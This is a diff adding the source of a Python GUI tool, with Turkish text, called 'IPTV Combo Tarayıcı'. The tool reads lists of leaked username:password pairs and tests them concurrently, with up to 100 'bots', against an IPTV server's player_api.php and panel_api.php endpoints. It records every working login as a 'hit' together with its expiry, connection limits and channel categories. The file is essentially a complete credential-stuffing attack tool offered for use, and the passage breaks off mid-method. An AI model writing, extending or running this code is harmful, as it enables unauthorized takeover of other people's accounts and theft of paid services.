@@ -1,0 +1,1092 @@
+# -*- coding: utf-8 -*-
+"""
+IPTV Combo Tarayıcı (Async) - PySide6 + asyncio + aiohttp
+- Güvenli ve basitleştirilmiş versiyon
+- Lisans kontrolü kaldırıldı
+- HWID toplama kaldırıldı
+"""
+
+import sys
+import json
+import asyncio
+import aiohttp
+import contextlib
+from pathlib import Path
+from datetime import datetime, timezone
+from typing import List, Dict, Any, Optional
+from PySide6.QtCore import Qt, Signal, QObject, QThread, QCoreApplication, QTimer
+from PySide6.QtGui import QIcon, QAction, QFont
+from PySide6.QtWidgets import (
+    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
+    QPushButton, QTextEdit, QLineEdit, QCheckBox, QFileDialog, QProgressBar,
+    QGridLayout, QSlider, QDialog, QTableWidget, QTableWidgetItem,
+    QHeaderView, QAbstractItemView, QMessageBox, QInputDialog, QComboBox,
+    QSpinBox, QGroupBox
+)
+
+# Sabit yollar
+APP_DIR = Path.cwd()
+ICON_DIR = APP_DIR / "icons"
+SERVER_JSON = APP_DIR / "server_list.json"
+COMBO_JSON = APP_DIR / "combo_list.json"
+HIT_SOUND_FILE = ICON_DIR / "hit.wav"
+
+def icon(name: str) -> QIcon:
+    p = ICON_DIR / name
+    return QIcon(str(p)) if p.exists() else QIcon()
+
+def read_json(path: Path, default):
+    if path.exists():
+        try:
+            return json.loads(path.read_text(encoding="utf-8"))
+        except Exception:
+            return default
+    return default
+
+def write_json(path: Path, data):
+    path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
+
+def load_servers() -> List[Dict[str, Any]]:
+    return read_json(SERVER_JSON, [])
+
+def save_servers(servers: List[Dict[str, Any]]):
+    write_json(SERVER_JSON, servers)
+
+def load_combos() -> List[Dict[str, Any]]:
+    return read_json(COMBO_JSON, [])
+
+def save_combos(combos: List[Dict[str, Any]]):
+    write_json(COMBO_JSON, combos)
+
+# Ses fonksiyonları
+try:
+    import winsound
+    def play_hit_sound():
+        try:
+            if HIT_SOUND_FILE.exists():
+                winsound.PlaySound(str(HIT_SOUND_FILE), winsound.SND_FILENAME | winsound.SND_ASYNC)
+            else:
+                winsound.Beep(1200, 220)
+        except Exception:
+            pass
+except Exception:
+    def play_hit_sound():
+        sys.stdout.write("\a")
+        sys.stdout.flush()
+
+def norm_server_url(server_addr: str) -> str:
+    s = server_addr.strip()
+    if not s:
+        return ""
+    if not (s.startswith("http://") or s.startswith("https://")):
+        s = "http://" + s
+    return s.rstrip("/")
+
+def format_ts_utc(ts: Any) -> str:
+    try:
+        t = int(ts)
+        dt = datetime.fromtimestamp(t, tz=timezone.utc)
+        return dt.strftime('%d.%m.%Y %H:%M:%S')
+    except Exception:
+        return "-"
+
+def build_m3u_url(server_addr: str, user: str, pwd: str) -> str:
+    base = norm_server_url(server_addr)
+    if not base:
+        return ""
+    return f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus"
+
+class AsyncScanner(QObject):
+    hit = Signal(dict)
+    progress_tick = Signal(int)
+    finished = Signal()
+    connection_error = Signal(str)
+
+    def __init__(self, server: str, pairs: List[tuple], timeout_s: int, get_cats: bool):
+        super().__init__()
+        self.server = server
+        self.pairs = pairs
+        self.timeout_s = timeout_s
+        self.get_cats = get_cats
+        self._thread: Optional[QThread] = None
+        self._cancel_event = asyncio.Event()
+        self._desired_concurrency = 10
+        self._tasks: List[asyncio.Task] = []
+        self._main_win = None
+
+    def set_concurrency(self, n: int):
+        self._desired_concurrency = max(1, int(n))
+
+    def start(self, main_win):
+        self._main_win = main_win
+        t = QThread()
+        t.run = self._thread_entry
+        t.finished.connect(self.finished)
+        self._thread = t
+        t.start()
+
+    def stop(self):
+        if self._thread and self._thread.isRunning():
+            self._cancel_event.set()
+
+    def _thread_entry(self):
+        try:
+            asyncio.run(self._main())
+        except asyncio.CancelledError:
+            pass
+        finally:
+            pass
+
+    async def _main(self):
+        self._cancel_event.clear()
+        timeout = aiohttp.ClientTimeout(total=self.timeout_s)
+        connector = aiohttp.TCPConnector(limit=0)
+        
+        try: 
+            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
+                sem = asyncio.Semaphore(self._desired_concurrency)
+                pairs_iter = iter(self.pairs)
+
+                async def auth_and_emit():
+                    try:
+                        while not self._cancel_event.is_set():
+                            try:
+                                user, pwd = next(pairs_iter)
+                            except StopIteration:
+                                return 
+                            
+                            async with sem:
+                                if self._cancel_event.is_set():
+                                    return
+                                
+                                hit = await self._check_one(session, user, pwd)
+                                if hit:
+                                    if self._main_win and self._main_win.chk_sound.isChecked():
+                                        play_hit_sound()
+                                    self.hit.emit(hit)
+
+                                if not self._cancel_event.is_set():
+                                    self.progress_tick.emit(1)
+                    
+                    except asyncio.CancelledError:
+                        pass
+                    except aiohttp.ClientConnectorError:
+                        self.connection_error.emit("Lütfen server adresini kontrol edin.")
+                        self._cancel_event.set()
+                    except aiohttp.ClientError as e:
+                        error_msg = str(e).lower()
+                        if "dns" in error_msg or "cannot connect" in error_msg or "connection refused" in error_msg:
+                            self.connection_error.emit("Lütfen server adresini kontrol edin.")
+                        else:
+                            self.connection_error.emit(f"Sunucuya bağlanırken beklenmedik bir hata oluştu: {e}. Lütfen server adresini kontrol edin.")
+                        self._cancel_event.set()
+                    except Exception as e:
+                        print(f"Beklenmedik bir hata: {e}")
+
+                async def adjuster():
+                    last = self._desired_concurrency
+                    while not self._cancel_event.is_set():
+                        cur = self._desired_concurrency
+                        if cur != last:
+                            if cur > last:
+                                for _ in range(cur - last):
+                                    sem.release()
+                            last = cur
+                        await asyncio.sleep(0.15)
+                
+                tasks = [asyncio.create_task(auth_and_emit()) for _ in range(self._desired_concurrency)]
+                adj_task = asyncio.create_task(adjuster())
+
+                await asyncio.gather(*tasks, adj_task, return_exceptions=True)
+            
+        except asyncio.CancelledError:
+            pass
+        except Exception as e:
+            print(f"Error in AsyncScanner._main: {e}")
+
+    async def _check_one(self, session: aiohttp.ClientSession, user: str, pwd: str) -> Optional[Dict[str, Any]]:
+        base = norm_server_url(self.server)
+        if not base:
+            return None
+
+        async def get_json(url: str) -> Optional[Any]:
+            try:
+                async with session.get(url) as r:
+                    if r.status == 200:
+                        ct = r.headers.get("Content-Type", "")
+                        if "application/json" in ct:
+                            return await r.json(content_type=None)
+                        txt = await r.text()
+                        with contextlib.suppress(Exception):
+                            return json.loads(txt)
+                    else:
+                        return None 
+            except asyncio.CancelledError:
+                raise
+            except aiohttp.ClientConnectorError:
+                raise
+            except aiohttp.ClientError:
+                raise
+            except Exception:
+                return None
+            return None
+
+        data = await get_json(f"{base}/player_api.php?username={user}&password={pwd}")
+        
+        if not isinstance(data, dict):
+            return None
+            
+        uinfo = data.get("user_info") or {}
+        auth_ok = str(uinfo.get("auth", "0")).lower() in ("1", "true")
+        if not auth_ok:
+            return None
+
+        cats: List[str] = []
+        if self.get_cats:
+            c1 = await get_json(f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_categories")
+            if isinstance(c1, list):
+                for c in c1:
+                    if isinstance(c, dict):
+                        n = (c.get("category_name") or "").strip()
+                        if n: cats.append(n)
+            
+            if not cats:
+                c2 = await get_json(f"{base}/panel_api.php?username={user}&password={pwd}")
+                if isinstance(c2, dict):
+                    lc = c2.get("categories") or c2.get("live_categories") or []
+                    if isinstance(lc, list):
+                        for c in lc:
+                            if isinstance(c, dict):
+                                n = (c.get("category_name") or "").strip()
+                                if n: cats.append(n)
+
+            if not cats:
+                c3 = await get_json(f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams")
+                if isinstance(c3, list):
+                    for s in c3:
+                        if isinstance(s, dict):
+                            n = (s.get("category_name") or s.get("category_name_raw") or "").strip()
+                            if n: cats.append(n)
+
+            _norm = []
+            for x in cats:
+                x = " ".join(x.split())
+                if x and x not in _norm:
+                    _norm.append(x)
+            cats = sorted(_norm)
+
+        return {
+            "server": base,
+            "username": user,
+            "password": pwd,
+            "status": "Active",
+            "max_connections": int(uinfo.get("max_connections", 0) or 0),
+            "active_cons": int(uinfo.get("active_cons", 0) or 0),
+            "trial": str(uinfo.get("trial", "0")).lower() in ("1", "true"),
+            "created_at": format_ts_utc(uinfo.get("created_at", 0)),
+            "exp_date": format_ts_utc(uinfo.get("exp_date", '-') or 0),
+            "outputs": ", ".join(uinfo.get("allowed_output_formats", []) or ["m3u8", "ts", "rtmp"]),
+            "categories": cats,
+        }
+
+class TableManagerDialog(QDialog):
+    def __init__(self, title, records, columns, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle(title)
+        self.resize(820, 460)
+        self.records = records
+        self.columns = columns
+
+        self.table = QTableWidget(0, len(columns))
+        self.table.setHorizontalHeaderLabels([c[1] for c in columns])
+        for i in range(len(columns)):
+            self.table.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)
+        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
+        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
+        self.table.itemDoubleClicked.connect(self._dbl_select)
+
+        btn_select = QPushButton(icon("liste.png"), "Seç")
+        btn_delete = QPushButton(icon("temizle.png"), "Sil")
+        btn_close  = QPushButton(icon("cikis.png"), "Kapat")
+
+        btn_select.clicked.connect(self.accept)
+        btn_delete.clicked.connect(self.delete_selected)
+        btn_close.clicked.connect(self.reject)
+
+        bl = QHBoxLayout()
+        bl.addWidget(btn_select)
+        bl.addWidget(btn_delete)
+        bl.addStretch()
+        bl.addWidget(btn_close)
+
+        lay = QVBoxLayout(self)
+        lay.addWidget(self.table)
+        lay.addLayout(bl)
+
+        self.populate()
+
+    def populate(self):
+        self.table.setRowCount(0)
+        for rec in self.records:
+            r = self.table.rowCount()
+            self.table.insertRow(r)
+            for c, (key, _) in enumerate(self.columns):
+                self.table.setItem(r, c, QTableWidgetItem(str(rec.get(key, ""))))
+
+    def delete_selected(self):
+        row = self.table.currentRow()
+        if row < 0:
+            return
+        if 0 <= row < len(self.records):
+            del self.records[row]
+        self.populate()
+
+    def _dbl_select(self, item: QTableWidgetItem):
+        self.table.selectRow(item.row())
+        self.accept()
+
+    def selected_record(self):
+        row = self.table.currentRow()
+        if row < 0:
+            return None
+        return self.records[row] if 0 <= row < len(self.records) else None
+
+DARK_QSS = """
+* { font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif; }
+QMainWindow { background-color: #0d1117; }
+QWidget { color: #c9d1d9; background-color: #0d1117; }
+
+QMenuBar { background: #161b22; color: #f3f4f6; padding: 6px; }
+QMenuBar::item { padding: 8px 12px; }
+QMenuBar::item:selected { background: #21262d; border-radius: 6px; }
+QMenu { background: #161b22; color: #c9d1d9; border: 1px solid #30363d; border-radius: 8px; }
+QMenu::item:selected { background: #21262d; }
+
+QGroupBox { 
+    border: 1px solid #30363d; 
+    border-radius: 10px; 
+    margin-top: 20px;
+    padding-top: 15px; 
+}
+QGroupBox::title { 
+    subcontrol-origin: margin; 
+    subcontrol-position: top center; 
+    padding: 0 10px; 
+    background-color: #0d1117;
+    color: #58a6ff;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+QLineEdit, QTextEdit, QTableWidget, QComboBox, QSpinBox {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 5px;
+    color: #c9d1d9;
+}
+QLineEdit:focus, QTextEdit:focus, QTableWidget:focus {
+    border: 1px solid #58a6ff;
+}
+QComboBox::drop-down {
+    border: 0px;
+    width: 20px;
+}
+QComboBox::down-arrow {
+    image: url(icons/down-arrow.png);
+}
+
+QProgressBar {
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    text-align: center;
+    background-color: #161b22;
+    color: #c9d1d9;
+}
+QProgressBar::chunk {
+    background-color: #58a6ff;
+    border-radius: 8px;
+}
+
+QPushButton {
+    background-color: #21262d;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 8px 16px;
+    color: #c9d1d9;
+    min-width: 80px;
+}
+QPushButton:hover {
+    background-color: #30363d;
+}
+QPushButton:pressed {
+    background-color: #58a6ff;
+    border: 1px solid #58a6ff;
+}
+QPushButton:disabled {
+    background-color: #161b22;
+    color: #444c56;
+    border: 1px solid #2d333b;
+}
+
+QCheckBox {
+    spacing: 5px;
+}
+QCheckBox::indicator {
+    width: 13px;
+    height: 13px;
+    border: 1px solid #30363d;
+    border-radius: 4px;
+    background-color: #161b22;
+}
+QCheckBox::indicator:checked {
+    background-color: #58a6ff;
+    border: 1px solid #58a6ff;
+}
+QCheckBox::indicator:hover {
+    border: 1px solid #58a6ff;
+}
+
+QLabel {
+    padding: 2px;
+}
+QLabel#hitTitle {
+    color: #ffffff;
+    font-weight: bold;
+    font-size: 16px;
+}
+"""
+
+LIGHT_QSS = """
+* { font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif; }
+QMainWindow { background-color: #eef1f5; }
+QWidget { color: #3c4043; background-color: #eef1f5; }
+
+QMenuBar { background: #d7dce2; color: #1f2326; padding: 6px; }
+QMenuBar::item { padding: 8px 12px; }
+QMenuBar::item:selected { background: #c6cdd4; border-radius: 6px; }
+QMenu { background: #d7dce2; color: #3c4043; border: 1px solid #b3b9c4; border-radius: 8px; }
+QMenu::item:selected { background: #c6cdd4; }
+
+QGroupBox { 
+    border: 1px solid #b3b9c4; 
+    border-radius: 10px; 
+    margin-top: 20px;
+    padding-top: 15px; 
+}
+QGroupBox::title { 
+    subcontrol-origin: margin; 
+    subcontrol-position: top center; 
+    padding: 0 10px; 
+    background-color: #eef1f5;
+    color: #1a73e8;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+QLineEdit, QTextEdit, QTableWidget, QComboBox, QSpinBox {
+    background: #ffffff;
+    border: 1px solid #b3b9c4;
+    border-radius: 8px;
+    padding: 5px;
+    color: #3c4043;
+}
+QLineEdit:focus, QTextEdit:focus, QTableWidget:focus {
+    border: 1px solid #1a73e8;
+}
+QComboBox::drop-down {
+    border: 0px;
+    width: 20px;
+}
+QComboBox::down-arrow {
+    image: url(icons/down-arrow-dark.png);
+}
+
+QProgressBar {
+    border: 1px solid #b3b9c4;
+    border-radius: 8px;
+    text-align: center;
+    background-color: #ffffff;
+    color: #3c4043;
+}
+QProgressBar::chunk {
+    background-color: #1a73e8;
+    border-radius: 8px;
+}
+
+QPushButton {
+    background-color: #e2e5e9;
+    border: 1px solid #b3b9c4;
+    border-radius: 8px;
+    padding: 8px 16px;
+    color: #3c4043;
+    min-width: 80px;
+}
+QPushButton:hover {
+    background-color: #d7dce2;
+}
+QPushButton:pressed {
+    background-color: #1a73e8;
+    border: 1px solid #1a73e8;
+    color: #ffffff;
+}
+QPushButton:disabled {
+    background-color: #e2e5e9;
+    color: #aeb4ba;
+    border: 1px solid #c8ccd4;
+}
+
+QCheckBox {
+    spacing: 5px;
+}
+QCheckBox::indicator {
+    width: 13px;
+    height: 13px;
+    border: 1px solid #b3b9c4;
+    border-radius: 4px;
+    background-color: #ffffff;
+}
+QCheckBox::indicator:checked {
+    background-color: #1a73e8;
+    border: 1px solid #1a73e8;
+}
+QCheckBox::indicator:hover {
+    border: 1px solid #1a73e8;
+}
+
+QLabel {
+    padding: 2px;
+}
+QLabel#hitTitle {
+    color: #1a73e8;
+    font-weight: bold;
+    font-size: 16px;
+}
+"""
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("IPTV Combo Tarayıcı")
+        self._fit_to_screen()
+
+        self.dark_mode = True
+        self.scanner: Optional[AsyncScanner] = None
+        self.hits: List[Dict[str, Any]] = []
+        self.filtered_cache: List[str] = []
+        self.total_accounts = 0
+        self.done_accounts = 0
+        self.link_counter = 0
+        self.is_scanning = False
+        self.is_paused = False
+        self.remaining_pairs: List[tuple] = []
+        
+        self._has_error_occurred = False
+        self._error_message = ""
+
+        self.scanner_server = ""
+        self.scanner_timeout = 0
+        self.scanner_get_cats = False
+        self.scanner_do_sound = False
+        
+        self._build_ui()
+        self._build_menu()
+        self.setStyleSheet(DARK_QSS)
+
+    def _fit_to_screen(self):
+        screen = QApplication.primaryScreen()
+        if screen:
+            g = screen.availableGeometry()
+            w = int(g.width() * 0.9)
+            h = int(g.height() * 0.88)
+            self.resize(w, h)
+            self.move(g.center() - self.rect().center())
+
+    def _build_menu(self):
+        menubar = self.menuBar()
+        file_menu = menubar.addMenu("Dosya")
+        act_save = QAction(icon("kaydet.png"), "Bulunan HIT'leri Kaydet", self)
+        act_save.triggered.connect(self.save_hits_to_file)
+        act_exit = QAction(icon("cikis.png"), "Çıkış", self)
+        act_exit.triggered.connect(self.close)
+        file_menu.addAction(act_save)
+        file_menu.addSeparator()
+        file_menu.addAction(act_exit)
+
+        settings_menu = menubar.addMenu("Ayarlar")
+        act_theme = QAction(icon("tema.png"), "Tema Değiştir (Açık/Koyu)", self)
+        act_theme.triggered.connect(self.toggle_theme)
+        act_change_sound = QAction(icon("ses.png"), "Hit Sesi Değiştir", self)
+        act_change_sound.triggered.connect(self.change_hit_sound)
+        settings_menu.addAction(act_theme)
+        settings_menu.addAction(act_change_sound)
+
+        help_menu = menubar.addMenu("Yardım")
+        act_about = QAction(icon("hakkinda.png"), "Hakkında", self)
+        act_about.triggered.connect(lambda: QMessageBox.information(self, "Hakkında", "IPTV Combo Tarayıcı 2025 versiyon 1"))
+        help_menu.addAction(act_about)
+
+    def _build_ui(self):
+        root = QVBoxLayout()
+        grid = QGridLayout()
+
+        self.combo_path = QLineEdit()
+        btn_browse = QPushButton(icon("gozat.png"), "Göz At")
+        btn_browse.clicked.connect(self.choose_combo)
+        btn_add_combo = QPushButton(icon("ekle.png"), "Hızlı Listeye Ekle")
+        btn_add_combo.clicked.connect(self.add_combo)
+        btn_pick_combo = QPushButton(icon("liste.png"), "Hızlı Liste Seç")
+        btn_pick_combo.clicked.connect(self.pick_combo)
+
+        r = 0
+        grid.addWidget(QLabel("Combo:"), r, 0)
+        grid.addWidget(self.combo_path, r, 1, 1, 3)
+        grid.addWidget(btn_browse, r, 4)
+        grid.addWidget(btn_add_combo, r, 5)
+        grid.addWidget(btn_pick_combo, r, 6)
+        r += 1
+
+        self.slider_bot = QSlider(Qt.Horizontal)
+        self.slider_bot.setRange(1, 100)
+        self.slider_bot.setValue(20)
+        self.lbl_bot_val = QLabel(str(self.slider_bot.value()))
+        self.slider_bot.valueChanged.connect(lambda v: self.lbl_bot_val.setText(str(v)))
+
+        self.spin_timeout = QSpinBox()
+        self.spin_timeout.setRange(2, 60)
+        self.spin_timeout.setValue(5)
+        self.spin_timeout.setSuffix(" sn")
+
+        grid.addWidget(QLabel("Bot sayısı:"), r, 0)
+        grid.addWidget(self.slider_bot, r, 1, 1, 2)
+        grid.addWidget(self.lbl_bot_val, r, 3)
+        grid.addWidget(QLabel("Zaman aşımı:"), r, 4)
+        grid.addWidget(self.spin_timeout, r, 5)
+        r += 1
+
+        self.server_input = QLineEdit()
+        self.server_input.setPlaceholderText("http://kalitemedya90.xyz:8080")
+        btn_save_srv = QPushButton(icon("kaydet.png"), "Server Kaydet")
+        btn_save_srv.clicked.connect(self.save_server)
+        btn_pick_srv = QPushButton(icon("sunucu.png"), "Server Seç")
+        btn_pick_srv.clicked.connect(self.pick_server)
+        grid.addWidget(QLabel("Server:"), r, 0)
+        grid.addWidget(self.server_input, r, 1, 1, 3)
+        grid.addWidget(btn_save_srv, r, 4)
+        grid.addWidget(btn_pick_srv, r, 5)
+        r += 1
+
+        opts = QHBoxLayout()
+        self.chk_cat = QCheckBox("Kategori eklensin")
+        self.chk_sound = QCheckBox("Hit sesi")
+        opts.addWidget(self.chk_cat)
+        opts.addWidget(self.chk_sound)
+        opts.addStretch()
+
+        controls = QHBoxLayout()
+        self.btn_start = QPushButton(icon("baslat.png"), "Başlat")
+        self.btn_pause = QPushButton(icon("durdur.png"), "Duraklat")
+        self.btn_stop  = QPushButton(icon("iptal.png"), "Durdur")
+        self.btn_clear = QPushButton(icon("temizle.png"), "Temizle")
+
+        self.btn_start.clicked.connect(self.start_scan)
+        self.btn_pause.clicked.connect(self.handle_pause_click)
+        self.btn_stop.clicked.connect(self.stop_scan)
+        self.btn_clear.clicked.connect(self.clear_hits)
+        
+        self.btn_pause.setEnabled(False)
+        self.btn_stop.setEnabled(False)
+        self.btn_clear.setEnabled(True)
+
+        self.chk_hide_adult = QCheckBox("+18 içerikleri gizle")
+        self.chk_only_tr    = QCheckBox("Sadece TR içerikleri göster")
+        self.chk_hide_adult.setEnabled(False)
+        self.chk_only_tr.setEnabled(False)
+        self.chk_cat.stateChanged.connect(self._on_cat_checkbox_change)
+        self.cbo_max_conn   = QComboBox()
+        self.cbo_max_conn.addItem("Max bağlantı: Tümü", userData=None)
+        self.chk_hide_adult.stateChanged.connect(self.render_hits)
+        self.chk_only_tr.stateChanged.connect(self.render_hits)
+        self.cbo_max_conn.currentIndexChanged.connect(self.render_hits)
+
+        btn_save_hits = QPushButton(icon("kaydet.png"), "Bulunan HIT'leri Kaydet")
+        btn_save_hits.clicked.connect(self.save_hits_to_file)
+
+        controls.addWidget(self.btn_start)
+        controls.addWidget(self.btn_pause)
+        controls.addWidget(self.btn_stop)
+        controls.addWidget(self.btn_clear)
+        controls.addStretch()
+        controls.addWidget(self.chk_hide_adult)
+        controls.addWidget(self.chk_only_tr)
+        controls.addWidget(self.cbo_max_conn)
+        controls.addWidget(btn_save_hits)
+
+        self.progress = QProgressBar()
+        self.progress.setMinimum(0)
+        self.progress.setMaximum(1)
+        self.progress.setValue(0)
+        self.lbl_progress = QLabel("0 / 0")
+
+        p_line = QHBoxLayout()
+        p_line.addWidget(self.progress)
+        p_line.addWidget(self.lbl_progress)
+
+        hits_group = QGroupBox("")
+        v = QVBoxLayout()
+        self.lbl_hits_title = QLabel("🔍 HIT'ler")
+        self.lbl_hits_title.setObjectName("hitTitle")
+        self.lbl_hits_title.setFont(QFont(self.font().family(), 11, QFont.Bold))
+        self.hit_label = QLabel("Bulunan HIT sayısı: 0")
+        self.hit_box = QTextEdit()
+        self.hit_box.setReadOnly(True)
+        self.hit_box.setFont(QFont("Consolas", 9))
+        v.addWidget(self.lbl_hits_title)
+        v.addWidget(self.hit_label)
+        v.addWidget(self.hit_box)
+        hits_group.setLayout(v)
+
+        root.addLayout(grid)
+        root.addLayout(opts)
+        root.addLayout(controls)
+        root.addLayout(p_line)
+        root.addWidget(hits_group)
+
+        container = QWidget()
+        container.setLayout(root)
+        self.setCentralWidget(container)
+            
+    def _on_cat_checkbox_change(self, state):
+        enabled = self.chk_cat.isChecked()
+        self.chk_hide_adult.setEnabled(enabled)
+        self.chk_only_tr.setEnabled(enabled)
+
+    def change_hit_sound(self):
+        global HIT_SOUND_FILE
+        path, _ = QFileDialog.getOpenFileName(self, "Hit Sesi Seç", str(APP_DIR), "Wave Files (*.wav)")
+        if path:
+            HIT_SOUND_FILE = Path(path)
+            QMessageBox.information(self, "Bilgi", f"Yeni hit sesi seçildi:\n{path}")
+
+    def toggle_theme(self):
+        self.dark_mode = not self.dark_mode
+        if self.dark_mode:
+            self.setStyleSheet(DARK_QSS)
+        else:
+            self.setStyleSheet(LIGHT_QSS)
+
+    def choose_combo(self):
+        path, _ = QFileDialog.getOpenFileName(self, "Combo Seç", str(APP_DIR), "Text Files (*.txt)")
+        if path:
+            self.combo_path.setText(path)
+
+    def add_combo(self):
+        p = self.combo_path.text().strip()
+        if not p:
+            QMessageBox.warning(self, "Uyarı", "Önce bir combo dosyası seçin.")
+            return
+        name, ok = QInputDialog.getText(self, "Hızlı Liste", "Liste adı:")
+        if not ok or not name.strip():
+            return
+        combos = load_combos()
+        combos.append({"name": name.strip(), "path": p, "date": datetime.now().strftime("%Y-%m-%d %H:%M")})
+        save_combos(combos)
+
+    def pick_combo(self):
+        combos = load_combos()
+        dlg = TableManagerDialog("Hızlı Liste", combos, [("name", "İsim"), ("path", "Yol"), ("date", "Tarih")], self)
+        if dlg.exec() == QDialog.Accepted:
+            rec = dlg.selected_record()
+            if rec:
+                self.combo_path.setText(str(rec.get("path", "")))
+        save_combos(dlg.records)
+
+    def save_server(self):
+        addr = self.server_input.text().strip()
+        if not addr:
+            QMessageBox.warning(self, "Uyarı", "Server adresi boş olamaz.")
+            return
+        name, ok = QInputDialog.getText(self, "Server", "Server adı:")
+        if not ok or not name.strip():
+            return
+        servers = load_servers()
+        servers.append({"name": name.strip(), "address": addr, "date": datetime.now().strftime("%Y-%m-%d %H:%M")})
+        save_servers(servers)
+
+    def pick_server(self):
+        servers = load_servers()
+        dlg = TableManagerDialog("Server", servers, [("name", "İsim"), ("address", "Adres"), ("date", "Tarih")], self)
+        if dlg.exec() == QDialog.Accepted:
+            rec = dlg.selected_record()
+            if rec:
+                self.server_input.setText(str(rec.get("address", "")))
+        save_servers(dlg.records)
+
+    def start_scan(self):
+        if self.is_scanning:
+            QMessageBox.warning(self, "Uyarı", "Tarama zaten devam ediyor.")
+            return
+
+        self.clear_hits()
+
+        combo = self.combo_path.text().strip()
+        if not Path(combo).exists():
+            QMessageBox.warning(self, "Uyarı", "Geçerli bir combo dosyası seçin.")
+            return
+        server = self.server_input.text().strip()
+        if not server:
+            QMessageBox.warning(self, "Uyarı", "Server adresi boş olamaz.")
+            return
+
+        try:
+            lines = Path(combo).read_text(encoding="utf-8", errors="ignore").splitlines()
+        except Exception as e:
+            QMessageBox.critical(self, "Hata", f"Combo okunamadı:\n{e}")
+            return
+
+        pairs: List[tuple] = []
+        for ln in lines:
+            ln = ln.strip()
+            if ":" in ln:
+                u, p = (x.strip() for x in ln.split(":", 1))
+                if u and p:
+                    pairs.append((u, p))
+        
+        if not pairs:
+            QMessageBox.warning(self, "Uyarı", "Combo içinde geçerli satır yok.")
+            return
+
+        self.remaining_pairs = pairs[:]
+        self.total_accounts = len(self.remaining_pairs)
+        self.done_accounts = 0
+        
+        self.scanner_server = server
+        self.scanner_timeout = self.spin_timeout.value()
+        self.scanner_get_cats = self.chk_cat.isChecked()
+        
+        self.is_scanning = True
+        self.is_paused = False
+        self.update_ui_state()
+        self.chk_sound.setEnabled(True)
+
+        self.progress.setMaximum(self.total_accounts)
+        self.progress.setValue(0)
+        self.lbl_progress.setText(f"0 / {self.total_accounts}")
+        self.setWindowTitle("IPTV Combo Tarayıcı (Tarama Başlatıldı...)")
+
+        self.scanner = AsyncScanner(
+            server=self.scanner_server,
+            pairs=self.remaining_pairs,
+            timeout_s=self.scanner_timeout,
+            get_cats=self.scanner_get_cats
+        )
+        self.scanner.set_concurrency(self.slider_bot.value())
+        self.scanner.hit.connect(self.on_hit)
+        self.scanner.progress_tick.connect(self.on_progress)
+        self.scanner.finished.connect(self.on_scan_finished)
+        self.scanner.connection_error.connect(self.on_scanner_connection_error)
+        self.scanner.start(self)
+        
+    def on_scanner_connection_error(self, message: str):
+        if self.scanner:
+            self.scanner.stop() 
+        self._has_error_occurred = True
+        self._error_message = message
+
+    def handle_pause_click(self):
+        if self.is_paused:
+            self.resume_scan()
+        else:
+            self.pause_scan()
+
+    def pause_scan(self):
+        if self.scanner:
+            self.is_paused = True
+            self.scanner.stop()
+            self.update_ui_state()
+            self.setWindowTitle("IPTV Combo Tarayıcı (Duraklatıldı)")
+
+    def resume_scan(self):
+        if not self.remaining_pairs:
+            QMessageBox.information(self, "Bilgi", "Devam edilecek hesap kalmadı.")
+            self.on_scan_finished()
+            return
+            
+        self.is_paused = False
+        self.is_scanning = True
+        self.update_ui_state()
+
+        self.setWindowTitle("IPTV Combo Tarayıcı (Tarama Devam Ediyor...)")
+        self.scanner = AsyncScanner(
+            server=self.scanner_server,
+            pairs=self.remaining_pairs,
+            timeout_s=self.scanner_timeout,
+            get_cats=self.scanner_get_cats
+        )
+        self.scanner.set_concurrency(self.slider_bot.value())
+        self.scanner.hit.connect(self.on_hit)
+        self.scanner.progress_tick.connect(self.on_progress)
+        self.scanner.finished.connect(self.on_scan_finished)
+        self.scanner.connection_error.connect(self.on_scanner_connection_error)
+        self.scanner.start(self)
+
+    def stop_scan(self):
+        if self.scanner:
+            self.scanner.stop()
+        self.is_scanning = False
+        self.is_paused = False
+        self.remaining_pairs.clear()
+        QMessageBox.information(self, "İptal Edildi", "Tarama işlemi iptal edildi.")
+        self.on_scan_finished()
+
+    def update_ui_state(self):
+        self.btn_start.setEnabled(not self.is_scanning and not self.is_paused)
+        self.btn_pause.setEnabled(self.is_scanning or self.is_paused)
+        self.btn_stop.setEnabled(self.is_scanning or self.is_paused)
+        self.btn_clear.setEnabled(not self.is_scanning and not self.is_paused)
+        self.combo_path.setEnabled(not self.is_scanning and not self.is_paused)
+        self.server_input.setEnabled(not self.is_scanning and not self.is_paused)
+        self.chk_sound.setEnabled(self.is_scanning or self.is_paused)
+        self.slider_bot.setEnabled(not self.is_scanning and not self.is_paused)
+        
+        if self.is_paused:
+            self.btn_pause.setText("Devam Et")
+            self.btn_pause.setIcon(icon("baslat.png"))
+            self.lbl_progress.setText(f"Duraklatıldı... {self.done_accounts} / {self.total_accounts}")
+        else:
+            self.btn_pause.setText("Duraklat")
+            self.btn_pause.setIcon(icon("durdur.png"))
+            self.lbl_progress.setText(f"{self.done_accounts} / {self.total_accounts}")
+
+    def on_scan_finished(self):
+        self.is_scanning = False
+        if self.scanner:
+            self.scanner = None 
+        
+        self.update_ui_state()
+        self.chk_sound.setEnabled(True)
+
+        if self._has_error_occurred:
+            QMessageBox.warning(self, "Bağlantı Hatası", self._error_message)
+            self._has_error_occurred = False
+            self._error_message = ""
+            self.setWindowTitle("IPTV Combo Tarayıcı (Hata)")
+        elif not self.is_paused:
+            self.setWindowTitle("IPTV Combo Tarayıcı (Bitti)")
+
+    def on_progress(self, inc: int):
+        self.done_accounts += inc
+        self.progress.setValue(self.done_accounts)
+        
